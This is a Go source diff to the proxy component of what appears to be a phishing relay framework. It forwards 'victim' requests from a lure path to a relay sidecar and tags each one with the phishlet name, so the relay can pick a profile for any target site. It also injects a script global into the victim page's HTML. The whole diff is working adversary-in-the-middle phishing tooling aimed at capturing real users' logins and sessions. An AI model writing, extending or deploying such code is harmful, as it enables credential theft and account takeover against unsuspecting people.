@@ -10,12 +10,16 @@ import (
 	"net/http/httputil"
 	"net/url"
 	"os"
+	"strconv"
 	"strings"
 
 	"github.com/elazarl/goproxy"
 )
 
-func (p *HttpProxy) relayPage(req *http.Request) (*http.Request, *http.Response) {
+// relayPage serves the relay sidecar's victim page at the lure path. The
+// phishlet name rides along as ?target= so the sidecar picks the right
+// relay profile (profiles/<phishlet>.yaml) for ANY target.
+func (p *HttpProxy) relayPage(req *http.Request, phishlet string) (*http.Request, *http.Response) {
 	backend := os.Getenv("EG_RELAY_BACKEND")
 	if backend == "" {
 		backend = "http://127.0.0.1:9445"
@@ -30,11 +34,29 @@ func (p *HttpProxy) relayPage(req *http.Request) (*http.Request, *http.Response)
 	r2.URL.Path = "/"
 	r2.URL.RawPath = ""
 	r2.RequestURI = ""
+	if phishlet != "" {
+		q := r2.URL.Query()
+		q.Set("target", phishlet)
+		r2.URL.RawQuery = q.Encode()
+	}
 	rp.ServeHTTP(rr, r2)
+	body := rr.Body.Bytes()
+	// the victim's address bar keeps the lure URL, so the page cannot read
+	// ?target= from location — inject it as a global before the page script
+	if ct := rr.Header().Get("Content-Type"); strings.Contains(ct, "text/html") && phishlet != "" {
+		inj := []byte("<script>window.__RELAY_TARGET__=" + strconv.Quote(phishlet) + ";</script>")
+		if i := bytes.Index(bytes.ToLower(body), []byte("<head>")); i >= 0 {
+			i += len("<head>")
+			nb := make([]byte, 0, len(body)+len(inj))
+			nb = append(nb, body[:i]...)
+			nb = append(nb, inj...)
+			body = append(nb, body[i:]...)
+		}
+	}
 	resp := goproxy.NewResponse(req, "text/html", rr.Code, "")
 	if resp != nil {
-		resp.Body = ioutil.NopCloser(bytes.NewReader(rr.Body.Bytes()))
-		resp.ContentLength = int64(rr.Body.Len())
+		resp.Body = ioutil.NopCloser(bytes.NewReader(body))
+		resp.ContentLength = int64(len(body))
 		if ct := rr.Header().Get("Content-Type"); ct != "" {
 			resp.Header.Set("Content-Type", ct)
 		}
